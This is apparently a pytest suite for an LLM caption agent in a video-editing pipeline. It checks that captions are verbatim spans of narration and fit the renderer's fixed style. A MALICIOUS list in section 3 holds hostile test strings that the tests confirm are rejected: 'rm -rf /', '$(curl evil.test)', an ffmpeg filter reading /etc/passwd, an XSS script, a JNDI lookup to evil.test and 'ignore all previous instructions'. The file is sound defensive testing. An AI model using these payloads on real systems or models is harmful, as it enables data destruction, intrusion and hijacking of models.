"""
Caption Agent.

The LLM is injected throughout - no test needs a key or a network. The
properties most of these defend:

  * the position and style are the ONE each the renderer has, read from
    fit_filter, and parity tests fail loudly if that ever changes
  * no caption says anything upstream did not: every line is a verbatim span
    of its beat's validated narration or story line, located by the agent
  * a caption can only land on a clip its beat names, and only on a beat the
    look left room for words on
  * no time, duration, position, colour or path is expressible
  * with no model nothing is invented - silence is the honest output
  * the words reach the renderer through Segment.caption -> captions.json
"""

import json
import typing

import pytest
from pydantic import ValidationError

from agents.artifacts import (Animation, AnimationDirection, Caption,
                              CaptionLine, CaptionPosition, CaptionStyle,
                              NarrationSegment, Segment, Story, StoryBeat,
                              Voiceover)
from agents.caption import (CaptionAgent, WORD_CAP, _engine_caption,
                            _engine_options, _extract, _locate, _max_chars)
from agents.tools.llm_tools import LLMClient, LLMReply
from agents.tools.pipeline_bridge import build_video

CALM, LIVELY = "01_calm.mp4", "02_lively.mp4"

LINES = {1: "Watch the drive gear bite into the idler, tooth by tooth.",
         2: "Every stage halves the speed and doubles the torque.",
         3: "And there it goes: the output shaft, turning at last."}
NARRATIVES = ["the first gear meshes with the second",
              "a slow reveal of the whole train",
              "the output shaft finally spins"]


# ------------------------------------------------------------- helpers

def cap_llm(payload, record=None):
    def transport(prompt, max_tokens, images=None):
        if record is not None:
            record.append(prompt)
        text = payload if isinstance(payload, str) else json.dumps(payload)
        return LLMReply(text=text, tokens_in=300, tokens_out=200, usd=0.003)
    return LLMClient(transport=transport)


def failing_llm(error="ConnectionError: refused"):
    def transport(prompt, max_tokens, images=None):
        return LLMReply(text="", error=error)
    return LLMClient(transport=transport)


def clip_for(beat_index):
    return LIVELY if beat_index % 2 == 1 else CALM


def a_story(n=3, live=True, narratives=NARRATIVES):
    bs = [StoryBeat(index=i + 1,
                    role=("hook" if i == 0 else
                          "ending" if i == n - 1 else "develop"),
                    clip_id=clip_for(i + 1),
                    narrative=narratives[i] if i < len(narratives) else "")
          for i in range(n)]
    return Story(domain="model engineering", story_type="reasoned",
                 logline="a gear train built and then run", beats=bs,
                 insufficient_signal=False, confidence=0.8, live=live)


def a_voiceover(lines=None, live=True):
    lines = LINES if lines is None else lines
    segs = [NarrationSegment(index=i, beat_index=bi, clip_id=clip_for(bi),
                             text=t)
            for i, (bi, t) in enumerate(sorted(lines.items()), 1)]
    return Voiceover(segments=segs, voiceover_type="reasoned",
                     beats_covered=sorted(lines), insufficient_signal=False,
                     confidence=0.8, live=live)


def an_animation(intents=("key_phrase", "short_label", "none"), live=True):
    ds = [AnimationDirection(index=i + 1, beat_index=i + 1,
                             clip_id=clip_for(i + 1), treatment="fill",
                             emphasis="subject", caption_intent=it)
          for i, it in enumerate(intents)]
    return Animation(animation_type="reasoned" if live else "degraded",
                     directions=ds, insufficient_signal=not live,
                     confidence=0.8 if live else 0.0, live=live)


GOOD = {
    "captions": [
        {"beat": 1, "text": "the drive gear bite into the idler",
         "intent": "key_phrase", "why": "names the mechanism"},
        {"beat": 2, "text": "doubles the torque", "intent": "short_label",
         "why": "the one number worth reading"},
    ],
    "unsupported_requests": [],
    "risks": ["could crowd a busy frame"],
    "limitations": ["three beats only"],
    "confidence": 0.8,
}


def run(ctx, tracer_span, story=None, voiceover=None, animation=None,
        clip_set=None, revision=0):
    agent = CaptionAgent()
    with tracer_span(ctx, "caption") as span:
        return agent.execute(ctx, span, story=story, voiceover=voiceover,
                             animation=animation, clip_set=clip_set,
                             revision=revision)


def full(ctx, tracer_span, clip_set, **kw):
    """The usual inputs: a story, its narration and a judged look."""
    kw.setdefault("story", a_story())
    kw.setdefault("voiceover", a_voiceover())
    kw.setdefault("animation", an_animation())
    return run(ctx, tracer_span, clip_set=clip_set, **kw)


@pytest.fixture
def cap_ctx(director_ctx):
    ctx, clip_set = director_ctx
    ctx.job = ctx.job.model_copy(update={
        "settings": ctx.job.settings.model_copy(
            update={"domain": "model engineering"})})
    return ctx, clip_set


def seg_dict(caption, start=0.0, end=3.0, orientation="horizontal"):
    return {"start": start, "end": end, "orientation": orientation,
            "caption": caption}


# ------------------------- 1. parity with the real renderer

def test_the_position_literal_is_the_renderers_only_position():
    assert list(typing.get_args(CaptionPosition)) == \
        _engine_caption()["positions"] == ["bottom_center"]


def test_the_style_literal_is_the_renderers_only_style():
    assert list(typing.get_args(CaptionStyle)) == \
        _engine_caption()["styles"] == ["outlined_white"]


@pytest.mark.parametrize("canvas,orient", [((1920, 1080), "horizontal"),
                                           ((1080, 1920), "vertical")])
def test_the_measured_placement_is_what_fit_filter_emits(canvas, orient):
    """Not a regex over the source: the filter the renderer actually builds."""
    e = _engine_caption()
    body, label = build_video.fit_filter(seg_dict("hello"), canvas)
    assert label == "[vc]"
    assert body.count("drawtext") == 1, "one caption slot per segment"
    assert "x=(w-text_w)/2" in body
    assert f"y={e['y'][orient]}" in body
    assert f"fontsize={e['size'][orient]}" in body
    assert "fontcolor=white" in body and "borderw=3" in body
    lo, hi = e["margins"]
    assert f"between(t\\,{lo:.2f}\\,{3.0 - hi:.2f})" in body


def test_there_is_no_second_position_or_style_in_the_renderer():
    """If fit_filter grows a choice, these literals must grow with it."""
    import inspect
    src = inspect.getsource(build_video.fit_filter)
    assert src.count("drawtext") == 1
    assert src.count("fontcolor=") == 1
    assert src.count("x=(w-text_w)/2") == 1
    assert "box=1" not in src


def test_an_empty_caption_draws_nothing():
    body, label = build_video.fit_filter(seg_dict(""), (1920, 1080))
    assert "drawtext" not in body and label == "[v]"


def test_the_dropped_characters_are_what_esc_strips():
    e = _engine_caption()
    assert e["dropped"], "esc() strips nothing? then this agent is wrong"
    for ch in e["dropped"]:
        assert ch not in build_video.esc(f"a{ch}b")
    # escaped, not dropped - these survive
    assert ":" in build_video.esc("a:b")


def test_max_chars_comes_from_the_renderer_font_size():
    e = _engine_caption()
    h = _max_chars(e, (1920, 1080))
    v = _max_chars(e, (1080, 1920))
    assert h == int(0.9 * 1920 / (0.6 * e["size"]["horizontal"]))
    assert v < h, "a vertical canvas holds fewer characters"
    assert _max_chars(e, None) == v, "unknown canvas budgets short"


def test_capabilities_reach_the_artifact_and_are_not_model_output(
        cap_ctx, tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = cap_llm({**GOOD, "engine_options": ["anything at all"],
                       "max_chars": 999})
    p = full(ctx, tracer_span, clip_set).payload
    assert p.engine_options == _engine_options(_engine_caption())
    assert p.max_chars == _max_chars(_engine_caption(), clip_set.canvas)


def test_the_prompt_states_what_cannot_be_asked_for(cap_ctx, tracer_span):
    ctx, clip_set = cap_ctx
    seen = []
    ctx.llm = cap_llm(GOOD, record=seen)
    full(ctx, tracer_span, clip_set)
    prompt = seen[0]
    assert "bottom-centre only" in prompt
    assert "never wrapped" in prompt
    assert "copied EXACTLY" in prompt
    assert "Do not invent anything" in prompt
    assert "position, colour, size, box, animation or timing" in prompt


def test_the_prompt_lists_only_beats_with_room_and_their_own_words(
        cap_ctx, tracer_span):
    ctx, clip_set = cap_ctx
    seen = []
    ctx.llm = cap_llm(GOOD, record=seen)
    full(ctx, tracer_span, clip_set)
    prompt = seen[0]
    assert "[1]" in prompt and "[2]" in prompt
    assert "[3]" not in prompt, "beat 3 was marked 'none' by the look"
    assert LINES[1] in prompt and NARRATIVES[1] in prompt
    assert LINES[3] not in prompt


# ------------------------------------------- 2. a good reply

def test_a_valid_reply_becomes_grounded_captions(cap_ctx, tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = cap_llm(GOOD)
    art = full(ctx, tracer_span, clip_set)
    p = art.payload
    assert p.live and p.caption_type == "reasoned"
    assert [ln.beat_index for ln in p.lines] == [1, 2]
    one, two = p.lines
    assert one.text == "the drive gear bite into the idler"
    assert one.source == "voiceover" and one.text in LINES[1]
    assert two.text == "doubles the torque" and two.text in LINES[2]
    assert one.position == "bottom_center" and one.style == "outlined_white"
    assert not art.degraded and art.fallback_used is None


def test_the_envelope_is_complete(cap_ctx, tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = cap_llm(GOOD)
    art = full(ctx, tracer_span, clip_set)
    assert art.kind == "Caption"
    assert art.produced_by == "caption"
    assert art.inputs_hash and art.trace_id
    assert art.decisions
    assert 0.0 <= art.confidence <= 1.0
    assert art.cost.tokens_in == 300
    assert ctx.store.get(ctx.job.job_id, "Caption", Caption) is not None


def test_the_caption_is_the_sources_span_not_the_replys_spelling(
        cap_ctx, tracer_span):
    """The model may change case or drop punctuation; what is drawn is the
    upstream text exactly as it was validated."""
    ctx, clip_set = cap_ctx
    ctx.llm = cap_llm({"captions": [
        {"beat": 1, "text": "IDLER TOOTH BY TOOTH"}]})
    ln = full(ctx, tracer_span, clip_set).payload.lines[0]
    assert ln.text == "idler, tooth by tooth"


def test_story_lines_are_a_source_when_the_narration_lacks_the_words(
        cap_ctx, tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = cap_llm({"captions": [
        {"beat": 2, "text": "the whole train"}]})
    ln = full(ctx, tracer_span, clip_set).payload.lines[0]
    assert ln.source == "story" and ln.text == "the whole train"


def test_narration_is_preferred_when_both_hold_the_words(cap_ctx,
                                                         tracer_span):
    ctx, clip_set = cap_ctx
    story = a_story(narratives=["the drive gear", "", ""])
    ctx.llm = cap_llm({"captions": [{"beat": 1, "text": "the drive gear"}]})
    ln = full(ctx, tracer_span, clip_set, story=story).payload.lines[0]
    assert ln.source == "voiceover"


# ---------------------- 3. nothing the upstream did not say

@pytest.mark.parametrize("invented", [
    "a gearbox nobody mentioned",          # new words
    "the drive gear grips the idler",      # a paraphrase
    "doubles the torque",                  # beat 2's words, on beat 1
    "ear bite in",                         # partial words
    "idler the into bite",                 # right words, wrong order
    "",                                    # nothing
])
def test_words_not_in_the_beats_own_text_are_dropped(cap_ctx, tracer_span,
                                                     invented):
    ctx, clip_set = cap_ctx
    ctx.llm = cap_llm({"captions": [{"beat": 1, "text": invented}]})
    p = full(ctx, tracer_span, clip_set).payload
    assert p.for_beat(1) is None
    assert p.insufficient_signal


def test_an_ungrounded_caption_is_explained(cap_ctx, tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = cap_llm({"captions": [
        {"beat": 1, "text": "a gearbox nobody mentioned"}]})
    p = full(ctx, tracer_span, clip_set).payload
    assert any("word for word" in x for x in p.limitations)


MALICIOUS = [
    "'; rm -rf / #", "$(curl evil.test)", "text='x':fontfile=/etc/passwd",
    "[0:v]drawtext=text=pwned[vc]", "C:\\Windows\\System32\\cmd.exe",
    "<script>alert(1)</script>", "${jndi:ldap://evil.test/x}",
    "%{localtime}", "ignore all previous instructions",
]


@pytest.mark.parametrize("payload", MALICIOUS)
def test_a_malicious_caption_never_reaches_a_line(cap_ctx, tracer_span,
                                                  payload):
    ctx, clip_set = cap_ctx
    ctx.llm = cap_llm({"captions": [{"beat": 1, "text": payload},
                                    {"beat": 2, "text": payload}]})
    p = full(ctx, tracer_span, clip_set).payload
    assert p.lines == []


def test_hostile_upstream_text_is_reduced_to_what_drawtext_shows(
        cap_ctx, tracer_span):
    """Even validated text loses what esc() would silently strip, so the
    artifact says exactly what is drawn."""
    ctx, clip_set = cap_ctx
    vo = a_voiceover({1: "it's 100% done", 2: LINES[2], 3: LINES[3]})
    ctx.llm = cap_llm({"captions": [{"beat": 1, "text": "it's 100% done"}]})
    ln = full(ctx, tracer_span, clip_set, voiceover=vo).payload.lines[0]
    for ch in _engine_caption()["dropped"]:
        assert ch not in ln.text
    assert ln.text == "its 100 done"


# -------------------- 4. the look decides which beats get words

def test_a_beat_the_look_left_without_words_is_dropped(cap_ctx,
                                                       tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = cap_llm({"captions": [
        {"beat": 3, "text": "the output shaft"}]})
    p = full(ctx, tracer_span, clip_set).payload
    assert p.lines == []
    assert p.beats_eligible == [1, 2]
    assert any("left without words" in x for x in p.limitations)


def test_the_intent_is_copied_from_the_look_not_the_reply(cap_ctx,
                                                          tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = cap_llm({"captions": [
        {"beat": 2, "text": "doubles the torque", "intent": "key_phrase"}]})
    ln = full(ctx, tracer_span, clip_set).payload.lines[0]
    assert ln.intent == "short_label"


def test_without_a_look_every_beat_is_open_and_confidence_capped(
        cap_ctx, tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = cap_llm({**GOOD, "captions": [
        {"beat": 3, "text": "the output shaft", "intent": "short_label"}],
        "confidence": 0.95})
    p = full(ctx, tracer_span, clip_set, animation=None).payload
    assert p.beats_eligible == [1, 2, 3]
    assert p.for_beat(3).intent == "short_label"
    assert p.confidence <= 0.6
    assert not p.animation_available
    assert any("decided here" in x for x in p.limitations)


def test_an_assembled_look_counts_as_unjudged(cap_ctx, tracer_span):
    """The deterministic look says 'none' everywhere for want of a basis;
    that is not a judgement that no beat wants words."""
    ctx, clip_set = cap_ctx
    ctx.llm = cap_llm({"captions": [{"beat": 3, "text": "the output shaft"}]})
    anim = an_animation(intents=("none", "none", "none"), live=False)
    p = full(ctx, tracer_span, clip_set, animation=anim).payload
    assert p.for_beat(3) is not None
    assert not p.animation_available


def test_a_judged_look_with_no_room_never_calls_the_model(cap_ctx,
                                                          tracer_span):
    ctx, clip_set = cap_ctx
    seen = []
    ctx.llm = cap_llm(GOOD, record=seen)
    anim = an_animation(intents=("none", "none", "none"))
    art = full(ctx, tracer_span, clip_set, animation=anim)
    assert seen == []
    assert art.payload.lines == []
    assert "no beat as wanting words" in art.fallback_used


# --------------------------- 5. no clip is ever invented

def test_the_clip_is_copied_from_the_beat(cap_ctx, tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = cap_llm({"captions": [
        {"beat": 2, "text": "doubles the torque",
         "clip_id": "99_invented.mp4", "path": "/etc/passwd"}]})
    ln = full(ctx, tracer_span, clip_set).payload.lines[0]
    assert ln.clip_id == CALM


@pytest.mark.parametrize("bad", [0, 4, 99, -1, "1", 1.5, True, None,
                                 {"a": 1}])
def test_a_beat_the_story_does_not_have_is_dropped(cap_ctx, tracer_span,
                                                   bad):
    ctx, clip_set = cap_ctx
    ctx.llm = cap_llm({"captions": [{"beat": bad,
                                     "text": "doubles the torque"}]})
    assert full(ctx, tracer_span, clip_set).payload.lines == []


def test_a_duplicate_caption_for_a_beat_keeps_the_first(cap_ctx,
                                                        tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = cap_llm({"captions": [
        {"beat": 2, "text": "doubles the torque"},
        {"beat": 2, "text": "halves the speed"}]})
    p = full(ctx, tracer_span, clip_set).payload
    assert [ln.text for ln in p.lines] == ["doubles the torque"]


def test_lines_follow_story_order_whatever_the_reply_order(cap_ctx,
                                                          tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = cap_llm({"captions": list(reversed(GOOD["captions"]))})
    p = full(ctx, tracer_span, clip_set).payload
    assert [ln.beat_index for ln in p.lines] == [1, 2]
    assert [ln.index for ln in p.lines] == [1, 2]


# ------------------ 6. no time, place, style or path is expressible

@pytest.mark.parametrize("field", ["start", "end", "duration", "at",
                                   "seconds", "font", "color", "filter",
                                   "path", "ffmpeg"])
def test_the_schema_makes_timing_style_and_paths_impossible(field):
    with pytest.raises(ValidationError):
        CaptionLine(index=1, beat_index=1, clip_id=CALM, text="x",
                    source="story", **{field: 1})


@pytest.mark.parametrize("field,value", [("position", "top_left"),
                                         ("style", "yellow_box")])
def test_only_the_renderers_position_and_style_validate(field, value):
    with pytest.raises(ValidationError):
        CaptionLine(index=1, beat_index=1, clip_id=CALM, text="x",
                    source="story", **{field: value})


def test_asking_for_a_position_or_style_is_recorded_not_honoured(
        cap_ctx, tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = cap_llm({"captions": [
        {"beat": 1, "text": "the drive gear", "position": "top",
         "color": "yellow", "animation": "typewriter"}]})
    p = full(ctx, tracer_span, clip_set).payload
    ln = p.lines[0]
    assert ln.position == "bottom_center" and ln.style == "outlined_white"
    joined = " ".join(p.unsupported_requests)
    assert "top" in joined and "yellow" in joined and "typewriter" in joined


def test_restating_the_supported_position_is_not_a_request(cap_ctx,
                                                           tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = cap_llm({"captions": [
        {"beat": 1, "text": "the drive gear", "position": "bottom center"}]})
    assert full(ctx, tracer_span, clip_set).payload.unsupported_requests == []


def test_a_model_sending_times_is_ignored_and_says_so(cap_ctx, tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = cap_llm({"captions": [
        {"beat": 1, "text": "the drive gear", "start": 1.0, "duration": 9}]})
    p = full(ctx, tracer_span, clip_set).payload
    assert p.lines[0].text == "the drive gear"
    assert any("fixes when a caption shows" in x for x in p.limitations)


def test_a_line_must_be_one_printable_line():
    for bad in ["two\nlines", "tab\there", "nul\x00byte", "   "]:
        with pytest.raises(ValidationError):
            CaptionLine(index=1, beat_index=1, clip_id=CALM, text=bad,
                        source="story")


def test_a_line_cannot_say_nothing():
    with pytest.raises(ValidationError):
        CaptionLine(index=1, beat_index=1, clip_id=CALM, text="x",
                    source="story", intent="none")


# ------------------------------------- 7. one line, and it fits

def test_a_phrase_too_wide_for_one_line_is_cut_back(cap_ctx, tracer_span):
    """It used to be dropped, and the segment lost its caption entirely.

    On a real six-segment cut that cost two of three eligible beats their
    words and only one line reached the screen. A prefix at a word boundary
    is still the upstream's own text - the same thing `_extract` already
    does on the deterministic path - so the line is cut back instead.
    """
    ctx, clip_set = cap_ctx
    longest = "Watch the drive gear bite into the idler, tooth by tooth"
    budget = _max_chars(_engine_caption(), clip_set.canvas)
    assert len(longest) > budget
    ctx.llm = cap_llm({"captions": [{"beat": 1, "text": longest}]})
    p = full(ctx, tracer_span, clip_set).payload

    assert p.lines, "the beat must keep a caption"
    line = p.lines[0].text
    assert len(line) <= budget, "it still has to fit on one line"
    assert longest.startswith(line.rstrip(",;:- ")),         "it must be a PREFIX of the upstream text, never a paraphrase"
    assert any("cut back to their opening words" in x for x in p.limitations)


def test_a_label_over_its_word_limit_is_cut_back(cap_ctx, tracer_span):
    """Same for the word cap: shorten to the limit rather than say nothing."""
    ctx, clip_set = cap_ctx
    six = "Every stage halves the speed and"
    assert len(six.split()) > WORD_CAP["short_label"]
    ctx.llm = cap_llm({"captions": [{"beat": 2, "text": six}]})
    p = full(ctx, tracer_span, clip_set).payload
    assert p.lines, "the beat must keep a caption"
    assert len(p.lines[0].text.split()) <= WORD_CAP["short_label"]
    assert six.startswith(p.lines[0].text.rstrip(",;:- "))


def test_the_artifact_rejects_a_line_wider_than_its_budget():
    with pytest.raises(ValidationError):
        Caption(max_chars=5, lines=[CaptionLine(
            index=1, beat_index=1, clip_id=CALM, text="too wide",
            source="story")])


def test_lines_are_contiguous_and_one_per_beat():
    one = CaptionLine(index=1, beat_index=1, clip_id=CALM, text="a",
                      source="story")
    with pytest.raises(ValidationError):
        Caption(lines=[one.model_copy(update={"index": 2})])
    with pytest.raises(ValidationError):
        Caption(lines=[one, one.model_copy(update={"index": 2})])


# ------------------------------------------ 8. malformed replies

@pytest.mark.parametrize("junk", ["not json", "", "[1,2,3]", '{"captions": '])
def test_malformed_replies_fall_back(cap_ctx, tracer_span, junk):
    ctx, clip_set = cap_ctx
    ctx.llm = cap_llm(junk)
    art = full(ctx, tracer_span, clip_set)
    assert art.degraded and art.fallback_used
    assert not art.payload.live


def test_a_failed_call_falls_back(cap_ctx, tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = failing_llm()
    art = full(ctx, tracer_span, clip_set)
    assert art.degraded and "unusable" in art.fallback_used


def test_junk_types_are_survived(cap_ctx, tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = cap_llm({"captions": [None, 7, "x", [], {"beat": 1},
                                    {"beat": 1, "text": 12}],
                       "risks": "not a list", "limitations": {"a": 1},
                       "unsupported_requests": None, "confidence": "high"})
    p = full(ctx, tracer_span, clip_set).payload
    assert p.lines == [] and p.confidence == 0.0


@pytest.mark.parametrize("bad", [5.0, -3, float("nan"), float("inf"), "x",
                                 None])
def test_confidence_is_always_in_range(cap_ctx, tracer_span, bad):
    ctx, clip_set = cap_ctx
    ctx.llm = cap_llm({**GOOD, "confidence": bad})
    assert 0.0 <= full(ctx, tracer_span, clip_set).payload.confidence <= 1.0


def test_lists_are_bounded(cap_ctx, tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = cap_llm({**GOOD, "risks": ["r"] * 50,
                       "limitations": ["l"] * 50,
                       "unsupported_requests": ["u"] * 50})
    p = full(ctx, tracer_span, clip_set).payload
    assert len(p.risks) <= 8 and len(p.limitations) <= 8
    assert len(p.unsupported_requests) <= 8


# ------------------------------------------ 9. the fallback invents nothing

def test_with_no_api_key_nothing_is_captioned(cap_ctx, tracer_span):
    """No model means no judged look upstream either: no basis to put words
    on any beat, so none are put there."""
    ctx, clip_set = cap_ctx
    ctx.llm = LLMClient()
    anim = an_animation(intents=("none", "none", "none"), live=False)
    vo = a_voiceover({1: "", 2: "", 3: ""}, live=False)
    art = full(ctx, tracer_span, clip_set, animation=anim, voiceover=vo,
               story=a_story(live=False, narratives=["", "", ""]))
    assert art.payload.lines == []
    assert art.degraded and art.fallback_used
    assert art.payload.caption_type == "minimal"
    assert any("no words were invented" in x for x in art.payload.limitations)


def test_a_failed_model_with_a_judged_look_extracts_verbatim(cap_ctx,
                                                             tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = failing_llm()
    p = full(ctx, tracer_span, clip_set).payload
    assert [ln.beat_index for ln in p.lines] == [1, 2]
    budget = _max_chars(_engine_caption(), clip_set.canvas)
    for ln in p.lines:
        assert LINES[ln.beat_index].startswith(ln.text), "a prefix, verbatim"
        assert len(ln.text) <= budget
        assert len(ln.text.split()) <= WORD_CAP[ln.intent]
        assert ln.source == "voiceover"
    assert not p.live and p.confidence == 0.0


def test_extraction_stops_at_the_first_clause_and_a_word_boundary():
    src = "And there it goes: the output shaft, turning at last."
    assert _extract(src, "key_phrase", 60, []) == "And there it goes"
    assert _extract("one two three four five six seven", "short_label",
                    60, []) == "one two three four five"
    assert _extract("abcdefgh ijkl", "key_phrase", 10, []) == "abcdefgh"


def test_locate_matches_whole_words_in_order_and_returns_the_source():
    src = "The Gear Train, it turns"
    assert _locate("gear train it", src) == "Gear Train, it"
    assert _locate("ear tra", src) is None
    assert _locate("train gear", src) is None
    assert _locate("", src) is None


def test_no_story_produces_a_minimal_artifact(cap_ctx, tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = cap_llm(GOOD)
    art = run(ctx, tracer_span, clip_set=clip_set)
    assert art.payload.lines == []
    assert not art.payload.story_available
    assert "no story" in art.fallback_used


def test_placeholder_narration_and_empty_story_give_no_words(cap_ctx,
                                                             tracer_span):
    ctx, clip_set = cap_ctx
    seen = []
    ctx.llm = cap_llm(GOOD, record=seen)
    art = full(ctx, tracer_span, clip_set,
               voiceover=a_voiceover({1: "", 2: "", 3: ""}, live=False),
               story=a_story(narratives=["", "", ""]))
    assert seen == [], "the model was asked to caption beats with no words"
    assert art.payload.lines == []


# -------------------------------------------------- 10. caching

def test_identical_inputs_hit_the_cache(cap_ctx, tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = cap_llm(GOOD)
    a = full(ctx, tracer_span, clip_set)
    b = full(ctx, tracer_span, clip_set, revision=1)
    assert a.artifact_id == b.artifact_id


@pytest.mark.parametrize("change", [
    {"voiceover": a_voiceover({**LINES, 1: "A different line entirely."})},
    {"story": a_story(narratives=["changed", "", ""])},
    {"animation": an_animation(intents=("short_label", "none", "none"))},
])
def test_the_cache_invalidates_when_an_input_changes(cap_ctx, tracer_span,
                                                     change):
    ctx, clip_set = cap_ctx
    ctx.llm = cap_llm(GOOD)
    a = full(ctx, tracer_span, clip_set)
    b = full(ctx, tracer_span, clip_set, revision=1, **change)
    assert a.inputs_hash != b.inputs_hash


def test_the_cache_invalidates_when_the_canvas_changes(cap_ctx, tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = cap_llm(GOOD)
    a = full(ctx, tracer_span, clip_set)
    tall = clip_set.model_copy(update={"canvas": (1080, 1920)})
    b = full(ctx, tracer_span, tall, revision=1)
    assert a.inputs_hash != b.inputs_hash
    assert b.payload.max_chars < a.payload.max_chars


def test_the_cache_is_not_time_based(cap_ctx, tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = cap_llm(GOOD)
    a = full(ctx, tracer_span, clip_set)
    import time
    time.sleep(0.05)
    b = full(ctx, tracer_span, clip_set, revision=1)
    assert a.inputs_hash == b.inputs_hash


# ------------------------------------------- 11. trace and decisions

def test_the_trace_id_reaches_the_artifact(cap_ctx, tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = cap_llm(GOOD)
    with tracer_span(ctx, "caption") as span:
        art = CaptionAgent().execute(ctx, span, story=a_story(),
                                     voiceover=a_voiceover(),
                                     animation=an_animation(),
                                     clip_set=clip_set)
        assert art.trace_id == span.trace_id
    rows = [r for r in ctx.tracer.for_job(ctx.job.job_id)
            if r["node"] == "caption"]
    assert rows and art.artifact_id in rows[-1]["output_artifacts"]


def test_the_llm_call_is_recorded_in_the_trace(cap_ctx, tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = cap_llm(GOOD)
    full(ctx, tracer_span, clip_set)
    rows = [r for r in ctx.tracer.for_job(ctx.job.job_id)
            if r["node"] == "caption"]
    tools = [t["tool"] for r in rows for t in r["tool_calls"]]
    assert "llm.complete_json" in tools
    assert rows[-1]["tokens_in"] == 300 and rows[-1]["tokens_out"] == 200


def test_the_fallback_is_recorded_in_the_trace(cap_ctx, tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = failing_llm()
    full(ctx, tracer_span, clip_set)
    rows = [r for r in ctx.tracer.for_job(ctx.job.job_id)
            if r["node"] == "caption"]
    assert "deterministic captions" in rows[-1]["fallback_used"]


def test_decisions_use_the_existing_closed_enum(cap_ctx, tracer_span):
    from agents.artifacts import DecidedBy
    ctx, clip_set = cap_ctx
    ctx.llm = cap_llm({**GOOD, "unsupported_requests": ["karaoke"]})
    art = full(ctx, tracer_span, clip_set)
    allowed = set(typing.get_args(DecidedBy))
    assert {d.decided_by for d in art.decisions} <= allowed
    whats = {d.what for d in art.decisions}
    assert "Caption per beat" in whats
    assert "Asked for but not possible" in whats
    assert next(d for d in art.decisions
                if d.what == "What the renderer can draw"
                ).decided_by == "measurement"


def test_the_fallback_attributes_nothing_to_an_llm(cap_ctx, tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = failing_llm()
    art = full(ctx, tracer_span, clip_set)
    assert all(d.decided_by != "llm" for d in art.decisions)
    assert any(d.decided_by == "fallback" for d in art.decisions)


# ------------------------------- 12. the director, and the render path

def a_caption(*lines):
    """Lines as (beat_index, clip_id, text)."""
    return Caption(live=True, confidence=0.8, max_chars=60, lines=[
        CaptionLine(index=i, beat_index=bi, clip_id=cid, text=t,
                    source="voiceover")
        for i, (bi, cid, t) in enumerate(lines, 1)])


def direct(ctx, tracer_span, clip_set, caption, revision=0, **kw):
    from agents.editing_director import EditingDirectorAgent
    with tracer_span(ctx, "editing_director") as span:
        return EditingDirectorAgent().execute(
            ctx, span, clip_set=clip_set, caption=caption,
            revision=revision, **kw)


def test_the_director_puts_each_caption_on_its_clips_segment(cap_ctx,
                                                             tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = LLMClient()
    cap = a_caption((1, LIVELY, "the drive gear"),
                    (2, CALM, "doubles the torque"))
    plan = direct(ctx, tracer_span, clip_set, cap).payload
    want = {LIVELY: "the drive gear", CALM: "doubles the torque"}
    assert any(s.caption for s in plan.segments)
    for s in plan.segments:
        assert s.caption == want.get(s.clip_id, "")


def test_a_clip_gets_the_first_caption_in_story_order(cap_ctx, tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = LLMClient()
    cap = a_caption((1, LIVELY, "first"), (3, LIVELY, "third"))
    art = direct(ctx, tracer_span, clip_set, cap)
    lively = [s for s in art.payload.segments if s.clip_id == LIVELY]
    assert lively and lively[0].caption == "first"
    assert all(s.caption != "third" for s in art.payload.segments)
    d = next(d for d in art.decisions
             if d.what == "Captions from the Caption agent")
    assert "1 not placed" in d.chose


def test_a_caption_whose_clip_is_not_in_the_cut_is_not_moved(cap_ctx,
                                                             tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = LLMClient()
    cap = a_caption((1, "03_not_uploaded.mp4", "nowhere to go"))
    art = direct(ctx, tracer_span, clip_set, cap)
    assert all(s.caption == "" for s in art.payload.segments)
    d = next(d for d in art.decisions
             if d.what == "Captions from the Caption agent")
    assert "0 placed" in d.chose and "not placed" in d.chose


def test_the_director_sees_the_captions(cap_ctx, tracer_span):
    ctx, clip_set = cap_ctx
    seen = []
    ctx.llm = cap_llm({"strategy": "s", "opening_rationale": "r",
                       "segments": [{"clip_id": LIVELY,
                                     "target_seconds": 4.0, "reason": "x"}],
                       "rejected": []}, record=seen)
    direct(ctx, tracer_span, clip_set,
           a_caption((1, LIVELY, "the drive gear")))
    assert "THE CAPTIONS" in seen[0]
    assert '"the drive gear"' in seen[0]
    assert "You do NOT choose timestamps" in seen[0]


def test_the_reasoned_plan_carries_captions_too(cap_ctx, tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = cap_llm({"strategy": "s", "opening_rationale": "r",
                       "segments": [{"clip_id": LIVELY,
                                     "target_seconds": 4.0, "reason": "x"}],
                       "rejected": []})
    plan = direct(ctx, tracer_span, clip_set,
                  a_caption((1, LIVELY, "the drive gear"))).payload
    assert plan.segments[0].caption == "the drive gear"


def test_changed_captions_invalidate_the_edit_plan_cache(cap_ctx,
                                                         tracer_span):
    ctx, clip_set = cap_ctx
    ctx.llm = LLMClient()
    a = direct(ctx, tracer_span, clip_set, a_caption((1, LIVELY, "one")))
